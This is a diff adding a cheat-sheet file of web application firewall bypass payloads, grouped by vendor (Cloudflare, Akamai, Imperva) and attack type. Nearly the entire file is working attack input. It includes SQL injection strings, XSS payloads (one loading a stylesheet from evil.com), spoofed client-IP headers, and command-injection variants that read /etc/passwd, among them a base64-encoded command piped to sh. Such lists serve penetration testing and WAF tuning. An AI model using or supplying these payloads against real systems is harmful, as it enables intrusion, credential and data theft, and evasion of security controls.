@@ -1,0 +1,131 @@
+# WAF Bypass Techniques
+# Grouped by vendor and attack type
+
+# ══════════════════════════════════════════════════════
+# GENERIC BYPASS TECHNIQUES
+# ══════════════════════════════════════════════════════
+
+# ── Encoding variants ─────────────────────────────────
+%27                     # URL-encoded '
+%2527                   # Double URL-encoded '
+%252527                 # Triple URL-encoded '
+%u0027                  # Unicode '
+\u0027                  # Unicode escape
+&#39;                   # HTML entity
+&#x27;                  # HTML hex entity
+
+# ── Case mixing ───────────────────────────────────────
+SeLeCt
+sElEcT
+UNION%20SELECT
+UniOn%20SeLeCt
+
+# ── Whitespace alternatives ───────────────────────────
+%09    (tab)
+%0a    (newline)
+%0d    (carriage return)
+%0b    (vertical tab)
+%a0    (non-breaking space)
+/**/   (comment as space)
+
+# ── Null bytes ────────────────────────────────────────
+%00
+\0
+%0000
+
+# ── HTTP parameter pollution ──────────────────────────
+?id=1&id=2 UNION SELECT...
+?id=1%26id=2 UNION SELECT...
+
+# ── Chunked transfer encoding ────────────────────────
+Transfer-Encoding: chunked
+# Split payload across chunks
+
+# ── HTTP/2 smuggling (H2.CL / H2.TE) ────────────────
+# Use Burp HTTP Request Smuggler extension
+
+# ══════════════════════════════════════════════════════
+# CLOUDFLARE BYPASS
+# ══════════════════════════════════════════════════════
+# Headers that may bypass rules:
+X-Forwarded-For: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Client-IP: 127.0.0.1
+
+# SQL: scientific notation in numbers
+1e0UNION SELECT 1,2,3
+# SQL: Cloudflare doesn't block MySQL string functions well
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
+
+# XSS: Unicode encoding
+\u003cscript\u003ealert(1)\u003c/script\u003e
+<svg/onload=\u0061lert(1)>
+<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
+
+# ══════════════════════════════════════════════════════
+# AKAMAI BYPASS
+# ══════════════════════════════════════════════════════
+# Extra whitespace inside keywords
+SE LECT 1,2,3
+# Parameter pollution
+?a=1&a=1 UNION SELECT 1,2--
+# Alternate methods
+HEAD / HTTP/1.1
+OPTIONS / HTTP/1.1
+
+# ══════════════════════════════════════════════════════
+# IMPERVA / INCAPSULA BYPASS
+# ══════════════════════════════════════════════════════
+# Comment injection
+SE/**/LECT 1,2,3
+1/**/UNION/**/SELECT/**/NULL--
+# Double URL encode
+%2527  ( = %27 = ' )
+# multipart/form-data POST — Imperva often passes these
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+# ══════════════════════════════════════════════════════
+# SQL INJECTION WAF BYPASS
+# ══════════════════════════════════════════════════════
+# Inline comment as space
+1'/**/UNION/**/SELECT/**/NULL--
+# MySQL inline version comment
+1 /*!UNION*/ /*!SELECT*/ 1,2,3
+# Scientific notation
+1e0 UNION SELECT 1,2,3
+# Keyword concatenation (MySQL)
+CONCAT(0x73,0x65,0x6c,0x65,0x63,0x74) = 'select'
+# MSSQL: exec bypass
+EXEC(0x73656c65637420404076657273696f6e)
+
+# ══════════════════════════════════════════════════════
+# XSS WAF BYPASS
+# ══════════════════════════════════════════════════════
+# Event handlers on unusual elements
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<meter onmouseover=alert(1)>0</meter>
+<video><source onerror=alert(1)>
+# CSS injection → JS
+<style>@import'https://evil.com/xss.css'</style>
+# mXSS (mutation-based)
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+# Template literal
+<svg onload=`alert(1)`>
+# JS string continuation
+<a href="javascript:void(0)" onclick="al\
+ert(1)">
+
+# ══════════════════════════════════════════════════════
+# CMD INJECTION WAF BYPASS
+# ══════════════════════════════════════════════════════
+cat${IFS}/etc/passwd
+cat%09/etc/passwd
+c""at /etc/passwd
+c''at /etc/passwd
+ca\t /etc/passwd
+{cat,/etc/passwd}
+/bin/c?t /etc/passwd
+$(echo 'Y2F0IC9ldGMvcGFzc3dk'|base64 -d|sh)
